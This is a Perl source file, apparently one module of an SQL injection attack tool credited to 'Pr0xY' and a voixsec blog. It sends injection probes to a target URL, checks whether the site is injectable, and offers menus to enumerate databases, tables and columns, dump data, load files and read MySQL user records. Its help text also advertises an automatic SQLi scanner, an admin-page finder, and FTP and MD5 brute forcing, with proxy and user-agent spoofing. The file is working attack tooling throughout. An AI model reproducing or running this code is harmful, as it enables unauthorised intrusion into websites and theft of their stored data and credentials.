#!/usr/local/bin/perl

use Digest::MD5 qw(md5 md5_hex md5_base64);
use LWP::Simple; 
use LWP::UserAgent; 
use HTTP::Request; 
use Net::FTP;


#-----------------------------------------------------------------------------------------#
# Injection tool by VOİXSEC.BLOGSPOT.COM
# Code version: 2.0
# Function file: General file/functions
#-----------------------------------------------------------------------------------------#

$version = "2.2.0";

$ua = LWP::UserAgent->new(agent => 'Mozilla 5.2'); 
$ua->timeout(10); 
$ua->env_proxy;

&set_GlobalVariables();


sub set_GlobalVariables()
{
	$proxy = "";
	
	&find_argv("-h", "help", 1);
	&find_argv("-mc", "max_columns");
	
	if(!($max_columns =~ /\d+/))
	{
		$max_columns = 100;
	}
	
	&find_argv("-c", "comment");
	&find_argv("-t", "target");
	&find_argv("-p", "proxy");
	
	if($proxy eq "")
	{
		&find_argv("proxy",  "proxy");
	}
	
	&find_argv("-dt", "typeL");
	
	if($typeL =~ /\d/)
	{
		$type = $typeL;
	}
}

sub find_argv()
{
	$whatFind = $_[0];
	$verName  = $_[1];
	
	for($i = 0; $i < @ARGV; $i++)
	{
		if($ARGV[$i] eq $whatFind)
		{
			if($_[2])
			{
				&showHelp();
				exit;
			}
			
			$$verName = $ARGV[($i+1)];
			return 1;
		}
	}
	
	return 0;
}

sub showHelp()
{
	&generalPrint("", 1);
	
	print "Examples to use:\n\n";
	print "  *Mode(SQLi helper) : main.pl\n";
	print "  *Mode(Blind helper): main.pl blind\n";
	print "  *Mode(SQLi scanner): main.pl sis (automatic attack = 0 [0=false/1=true])*\n";
	print "  *Mode(AdminFinder) : main.pl adminFinder\n";
	print "  *Mode(FTP BF)      : main.pl FTPbf\n";
	print "  *Mode(MD5 BF)      : main.pl MD5bf\n";
	print "  *Mode(MD5 encode)  : main.pl MD5en\n";
	print "  *Mode(Hex)         : main.pl hex\n";
	print "  *Mode(Update)      : main.pl update\n";
	print "  *Mode(about)       : main.pl about\n\n";
	
	print "Fast use:\n\n";
	print "  -t        Is the target\n";
	print "  -mc       Is the maximun columns to find\n";
	print "  -p/pr0xy  Is the proxy for use\n";
	print "  -c        Is the comment for the injection\n";
	print "  -dt       Is the data base type(0=Mysql, 1=MSSQL)\n";
	print "  -h        For help\n\n";
	
	exit;
}

sub generalPrint()
{
	if($_[1] == 1)
	{
		system("cls");
	}
	
	print "+---------------------------------------+\n"; 
	print "+         Injection tool by Pr0xY       +\n"; 
	print "+             Version ".$version."             +\n"; 
	print "+---------------------------------------+\n\n"; 
	if(!($_[0] eq ""))
	{
		print $_[0]."\n\n";
	}
}

sub firstChomp()
{
	if(!($type =~ /\d+/))
	{
		print "Type (0=Mysql, 1=MSSQL): ";
		chomp($type = <STDIN>);
	}
	if(!($comment =~ /.+/))
	{
		print "Comment: ";
		chomp($comment = <STDIN>);
	}
	
	print "\n\nCreate connection, plase wait...\n\n";
}

sub blind_search()
{
	$concat  = "";
	$printer = "";
	$status  = $_[0];
	
	print "Blind injection try to bf...\nCan you guess prefix(y/n)? ";	
	chomp($answ = <STDIN>);
			
	if($answ eq 'y')
	{
		print "\nPrefix: ";
		chomp($prefix = <STDIN>);
	}
	
	&generalPrint("This is blind injection!",1);
	&blind_MySQL($prefix, $status);
}

sub startInject()
{
	if($type == 0)
	{	
		$normal = &ghs($target);
		&generalPrint("Target: ".$target,1);
		
		print "\nChecks if it's possible to inject\n";
		
		if(&same2Normal(&ghs($target."+AnD+/**//**/1=1--"), $target."+AnD+/**//**//**/1=2--"))
		{
			if(&same2Normal($normal, $target."'--"))
			{
				&generalPrint("Target: ".$target."\nCannot injection",1);
				exit;
			}
		}
				
		$printer = ""; 
		
		if($ARGV[0] eq "blind")
		{
			print "\n\n";
			&blind_search();
			exit;
		}
			
		$columns = &regular_MySQL_columns();
		$cop = &regular_MySQL_wherePrint();
			
		if($cop == 0)
		{
			&blind_search();
			exit;
		}
		
		&generalPrint("",1);
		
		@abous = &regular_MySQL_aboutServer();
		$data_bases = &regular_MySQL_databasesN();
		
		&generalPrint("",1);
				
		$serverA .= "User name     : ".$abous[0]."\n";
		$serverA .= "Data base     : ".$abous[1]."\n";
		$serverA .= "Version       : ".$abous[2]."\n";
		$serverA .= "Union columns : ".$columns."\n";
		$serverA .= "Databases     : ".$data_bases."\n";
		
		$printer .= $serverA;
		
		&generalPrint($printer,1);
	
		if(substr($abous[2],0,1)==4)
		{
			&blind_search(1);
		}
		else
		{
			&regular_MySQL();
		}	
	}
}

sub saveInFile()
{
	$file_saved = $target;
	
	if($file_saved =~ /http\:\/\/(((\d|\w)+(\.*))+)/)
	{
		$file_saved = $1;
	}
	
	if($_[0]) #Dump data
	{
		$file_saved .= "(Dump_Data)_".substr(md5_hex(rand()),0,5).".txt"; 
	}
	else
	{
		$file_saved .= "_".substr(md5_hex(rand()),0,5).".txt"; 
	}
		
	open (MYFILE, '>>scans/'.$file_saved);
	
	print MYFILE "+---------------------------------------\n"; 
	print MYFILE "+         Injection tool by Pr0xY     \n"; 
	print MYFILE "+           Version ".$version."          \n"; 
	print MYFILE "+---------------------------------------\n\n"; 
	print MYFILE "Target: ".$target."\n\n";
	print MYFILE $_[1];
			
	close (MYFILE); 
	
	&generalPrint($printer."\n\nStructure saved\n".$file_saved,1);
}

sub ascii2hex()
{
	$encoded_command = "";
	$sqlstr = $_[0]; 
 
	@ASCII = unpack("C*", $sqlstr); 
	foreach $line (@ASCII) 
	{ 
		$encoded = sprintf('%lx',$line); 
		$encoded_command .= $encoded; 
	} 
	return "0x".$encoded_command; 
}

sub pointsPrint()
{
	$print_result = "";
	
	if($points < 0 || $points > 2)
	{
		$points = 0;
	}
	$points++;
	
	for($i=0; $i<$points; $i++)
	{
		$print_result .= ".";
	}
	return $print_result;
}

sub hex2ascii($)
{
    (my $str = shift) =~ s/([a-fA-F0-9]{2})/chr(hex $1)/eg;
    return $str;
}

sub finder()
{
	$ua = LWP::UserAgent->new(agent => 'Mozilla 5.2'); 
	$ua->timeout(10); 
	$ua->env_proxy;
	
	$response = $ua->get($_[0]); 
	
	if($response->is_success)
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

sub ghs()
{	
	if(!($proxy eq ""))
	{
		$ua->proxy(['http', 'ftp'], $proxy);
	}

	$ua->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; InfoPath.2; .NET CLR 3.5.30729; .NET CLR 3.0.30618)');
	
	$ua->timeout(15);
	
	$response = $ua->get($_[0]); 
	
	if($response->is_success)
	{
		return $response->content;
	}
	else
	{
		if($_[1] != 1)
		{
			system("cls");
			
			print "\n\n";
			print "----------------------************************----------------------\n";
			print "                          Error connection \n\n";
			print "Error Code        : ".$response->code."\n";
			print "Error description : ".$response->status_line."\n";
			print "Connect type      : ".$response->content_type."\n";
			print "\n";
			print "Injection tool by Pr0xY v".$version."\n\n";
			print "                          Error connection \n";
			print "----------------------************************----------------------\n\n";
			exit 0;
		}
		else
		{
			return 0;
		}	
	}
}

sub in_array 
{    
	my ($arr,$search_for) = @_;     
	my %items = map {$_ => 1} @$arr;     
	return (exists($items{$search_for}))?1:0; 
}
 
sub get_list()
{
	@list = ();
	
	open(FILE, $_[0].$_[1]);
	while(<FILE>) 
	{
		chomp;
		$list[@list] = "$_\n";
	}
	close (FILE);
	return @list;
}

sub same2Normal()
{	
	if(&ghs($_[1]) eq $_[0])
	{
		return 1;
	}
	else
	{
		return 0;
	}
}

sub regular_MySQL_getVerb()
{
	print "\nSelect an action:\n\n";
	print "   0)Stop the scan"."\n";
	print "   1)Get Databases"."\n";
	print "   2)Get Tables"."\n";
	print "   3)Get Columns"."\n";
	print "   4)Dump data"."\n";
	print "   5)Load file"."\n";
	print "   6)MySQL.user"."\n";
	print "   7)Save structure"."\n";
	print "\n\n";
	print "Your choice: ";
	
	chomp($choice = <STDIN>);
	
	while(!($choice =~ /^\d$/) || $choice < 0 || $choice >= 8)
	{
		print "\nInvalid choice!\nYour choice: ";
		chomp($choice = <STDIN>);
	}
	&generalPrint($printer,1);
	return $choice;
}

sub str_replace
{
	my $search = shift;							
	my $replace = shift;							
	my $subject = shift;
	
	if (! defined $subject) {
		return -1; 
	}
	
	my $count = shift;
	
	if (! defined $count) 
	{
		$count = -1;
	}

	my ($i,$pos) = (0,0);
	
	while ( (my $idx = index( $subject, $search, $pos )) != -1 )
	{
		substr( $subject, $idx, length($search) ) = $replace;
		
		$pos=$idx+length($replace);	
		
		if ($count>0 && ++$i>=$count)
		{
			last; 
		}
	}

	return $subject;
}

1;
